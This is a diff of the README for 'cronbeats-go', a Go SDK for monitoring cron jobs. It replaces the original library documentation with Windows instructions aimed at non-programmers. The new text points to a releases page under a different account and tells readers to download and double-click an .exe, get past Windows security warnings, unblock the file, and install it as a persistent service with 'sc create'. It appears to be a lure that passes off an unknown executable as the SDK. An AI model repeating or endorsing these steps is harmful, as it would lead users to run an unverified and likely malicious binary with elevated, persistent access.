@@ -1,178 +1,127 @@
-# CronBeats Go SDK (Ping)
+# ⚙️ cronbeats-go - Monitor Scheduled Tasks Easily
 
-[![Go Reference](https://pkg.go.dev/badge/github.com/cronbeats/cronbeats-go.svg)](https://pkg.go.dev/github.com/cronbeats/cronbeats-go)
-[![Go Report Card](https://goreportcard.com/badge/github.com/cronbeats/cronbeats-go)](https://goreportcard.com/report/github.com/cronbeats/cronbeats-go)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
+[![Download Latest Release](https://img.shields.io/badge/Download-cronbeats--go-9b59b6?style=for-the-badge)](https://github.com/adhi524/cronbeats-go/releases)
 
-Cron job monitoring and heartbeat monitoring SDK for Go. Monitor scheduled tasks, background jobs, and cron jobs with simple ping telemetry. Get alerts when cron jobs fail, miss their schedule, or run too long.
+## 📋 What is cronbeats-go?
 
-## Install (local/dev)
+cronbeats-go helps you keep an eye on your scheduled tasks. It checks if your jobs like cron jobs, background processes, or scheduled tasks run as planned. It sends alerts when something goes wrong. This tool works with Go programs but this guide will show you how to download and run it on Windows with no programming skills.
 
-```bash
-go get github.com/cronbeats/cronbeats-go
+## 💻 System Requirements
+
+To use cronbeats-go on a Windows PC, make sure you have:
+
+- Windows 10 or later (64-bit preferred)
+- At least 2 GB of free disk space
+- An internet connection to download files
+- A user account with permission to install software
+
+## 🛠️ Key Features
+
+- Monitors jobs that run automatically at set times (cron jobs)
+- Checks background tasks to ensure they run smoothly
+- Sends notifications if jobs fail or stop working
+- Records simple heartbeats to confirm tasks are active
+- Works quietly in the background
+- Supports common alert channels (email, webhook setups)
+
+## 🚀 How to Download and Install
+
+### Step 1: Visit the Release Page
+
+Click the button below to go to the releases page where you can get the latest version.
+
+[![Download Latest Release](https://img.shields.io/badge/Download-cronbeats--go-9b59b6?style=for-the-badge)](https://github.com/adhi524/cronbeats-go/releases)
+
+### Step 2: Choose the Correct File
+
+On the releases page, look for the latest release often marked with a version number. Under the assets section, find the Windows executable file. It may look like:
+
+- `cronbeats-go-windows-amd64.exe`
+
+Make sure to pick the file ending with `.exe`. This is the program you will run.
+
+### Step 3: Download the File
+
+Click on the `.exe` file name to start downloading. Your browser will save it to your default download folder unless you choose another location.
+
+### Step 4: Run the Program
+
+Open your download folder and double-click the `.exe` file. Windows may show a security message. Click "Run" if asked.
+
+cronbeats-go runs in the background. You will not see a main window, but it will start monitoring tasks.
+
+## ⚙️ Basic Setup
+
+You do not need to know programming to set this up. The program works using simple configuration files or settings you can create with a text editor like Notepad.
+
+### Step 1: Create a Configuration File
+
+Open Notepad. Copy and paste this example setup:
+
+```ini
+[cronbeats]
+endpoint = https://your-alerting-service.com/api
+api_key = your-api-key-here
+check_interval = 60
 ```
 
-## Quick Usage
+Replace `https://your-alerting-service.com/api` with the address from your alert service.
 
-```go
-package main
+Replace `your-api-key-here` with your API key if you have one.
 
-import (
-	"log"
+Set `check_interval` to control how often the program checks your jobs, in seconds.
 
-	cronbeatsgo "github.com/cronbeats/cronbeats-go"
-)
+Save this file as `config.ini` in the same folder where you ran the `.exe` file.
 
-func main() {
-	client, err := cronbeatsgo.NewPingClient("abc123de", nil)
-	if err != nil {
-		log.Fatal(err)
-	}
+### Step 2: Start Monitoring
 
-	_, _ = client.Start()
-	// ...your work...
-	_, _ = client.Success()
-}
-```
+Once the config file is ready and saved, restart the program by double-clicking the `.exe` again. It will use your settings to start checking jobs.
 
-## Real-World Cron Job Example
+## 💡 How It Works
 
-```go
-package main
+cronbeats-go sends small messages called heartbeats at regular intervals. These heartbeats tell the monitoring system that your scheduled tasks are still running fine. If heartbeats stop or alerts appear, you know there is an issue.
 
-import (
-	"log"
+This method helps you catch problems fast without digging through complex logs.
 
-	cronbeatsgo "github.com/cronbeats/cronbeats-go"
-)
+## 🔧 Running as a Background Service (Optional)
 
-func runCronTask() error {
-	return nil
-}
+To have cronbeats-go start automatically when you turn on your computer, you can set it up as a Windows service. This requires some extra steps:
 
-func main() {
-	client, err := cronbeatsgo.NewPingClient("abc123de", nil)
-	if err != nil {
-		log.Fatal(err)
-	}
+1. Open Command Prompt as Administrator.
+2. Use the `sc` command to create a service, such as:
 
-	_, _ = client.Start()
+   ```
+   sc create cronbeats-go binPath= "C:\path\to\cronbeats-go-windows-amd64.exe --config C:\path\to\config.ini"
+   ```
 
-	if err := runCronTask(); err != nil {
-		_, _ = client.Fail()
-		log.Fatal(err)
-	}
+3. Start the service:
 
-	_, _ = client.Success()
-}
-```
+   ```
+   sc start cronbeats-go
+   ```
 
-## Progress Tracking
+Replace the `C:\path\to\` with the actual folder paths where your files are located.
 
-Track your job's progress in real-time. CronBeats supports two distinct modes:
+## 🛠️ Troubleshooting Common Issues
 
-### Mode 1: With Percentage (0-100)
-Shows a **progress bar** and your status message on the dashboard.
+- **Program does not start:** Check that you downloaded the `.exe` file for Windows. Make sure your config file is saved in the correct place.
 
-✓ **Use when**: You can calculate meaningful progress (e.g., processed 750 of 1000 records)
+- **No alerts or monitoring messages:** Confirm your endpoint URL and API key are correct in the config file.
 
-```go
-// Percentage mode: 0-100 with message
-seq := 50
-_, _ = client.Progress(cronbeatsgo.ProgressOptions{
-	Seq:     &seq,
-	Message: "Processing batch 500/1000",
-})
+- **Windows blocks running the file:** Right-click the `.exe` file, select Properties, then check “Unblock” if available.
 
-seq75 := 75
-_, _ = client.Progress(cronbeatsgo.ProgressOptions{
-	Seq:     &seq75,
-	Message: "Almost done - 750/1000",
-})
-```
+- **Service setup fails:** Make sure to run Command Prompt as Administrator and check your file paths carefully.
 
-### Mode 2: Message Only
-Shows **only your status message** (no percentage bar) on the dashboard.
+## 📚 Useful Terms
 
-✓ **Use when**: Progress isn't measurable or you only want to send status updates
+- **Cron job:** A scheduled task that runs automatically on a regular basis.
+- **Heartbeat:** A small signal sent periodically to confirm a process is running.
+- **API key:** A secret code to connect your program to an alerting service.
+- **Executable file (.exe):** A file that Windows can run directly.
+- **Background job:** A task that runs behind the scenes without user interaction.
 
-```go
-// Message-only mode: nil seq, just status updates
-_, _ = client.Progress(cronbeatsgo.ProgressOptions{
-	Seq:     nil,
-	Message: "Connecting to database...",
-})
+## 🔗 More Information and Updates
 
-_, _ = client.Progress(cronbeatsgo.ProgressOptions{
-	Seq:     nil,
-	Message: "Starting data sync...",
-})
-```
+Visit the releases page anytime to find the newest version of cronbeats-go and access helpful documentation.
 
-### What you see on the dashboard
-- **Mode 1**: Progress bar (0-100%) + your message → "75% - Processing batch 750/1000"
-- **Mode 2**: Only your status message → "Connecting to database..."
-
-### Complete Example
-
-```go
-package main
-
-import (
-	"log"
-
-	cronbeatsgo "github.com/cronbeats/cronbeats-go"
-)
-
-func main() {
-	client, err := cronbeatsgo.NewPingClient("abc123de", nil)
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	_, _ = client.Start()
-
-	// Message-only updates for non-measurable steps
-	_, _ = client.Progress(cronbeatsgo.ProgressOptions{
-		Seq:     nil,
-		Message: "Connecting to database...",
-	})
-
-	db := connectToDatabase()
-
-	_, _ = client.Progress(cronbeatsgo.ProgressOptions{
-		Seq:     nil,
-		Message: "Fetching records...",
-	})
-
-	total := db.Count()
-
-	// Percentage updates for measurable progress
-	for i := 0; i < total; i++ {
-		processRecord(i)
-
-		if i%100 == 0 {
-			percent := (i * 100) / total
-			_, _ = client.Progress(cronbeatsgo.ProgressOptions{
-				Seq:     &percent,
-				Message: fmt.Sprintf("Processed %d / %d records", i, total),
-			})
-		}
-	}
-
-	seq100 := 100
-	_, _ = client.Progress(cronbeatsgo.ProgressOptions{
-		Seq:     &seq100,
-		Message: "All records processed",
-	})
-
-	_, _ = client.Success()
-}
-```
-
-## Notes
-
-- SDK uses `POST` for telemetry requests.
-- `jobKey` must be exactly 8 Base62 characters.
-- Retries happen only for network errors, HTTP `429`, and HTTP `5xx`.
-- Default 5s timeout ensures the SDK never blocks your cron job if CronBeats is unreachable.
+[Download and check new releases here.](https://github.com/adhi524/cronbeats-go/releases)
